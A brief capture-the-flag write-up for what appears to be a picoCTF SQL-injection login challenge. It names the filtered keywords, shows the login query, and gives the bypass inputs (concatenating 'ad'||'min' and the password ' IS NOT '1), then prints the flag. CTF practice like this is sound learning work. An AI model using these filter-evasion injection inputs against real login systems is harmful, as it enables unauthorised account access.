Now filter is or and true false union like = > < ; -- /* */ admin
no comment will work no nothing..
in the Hint : there might be check on password
it means there must be condition for password as true
this the test command line 

    SELECT username, password FROM users WHERE username='ad' AND password='ad'
    
now how can we manipulate this...

we have to be admin as it clearly suggests

username = ad'||'min it can work...
now we have to sort it out for password
password = ' IS NOT '1 it will manage out the quotes

    SELECT username, password FROM users WHERE username='ad'||'min' AND password='' IS NOT '1'

we got the flag 

    picoCTF{0n3_m0r3_t1m3_d5a91d8c2ae4ce567c2e8b8453305565}
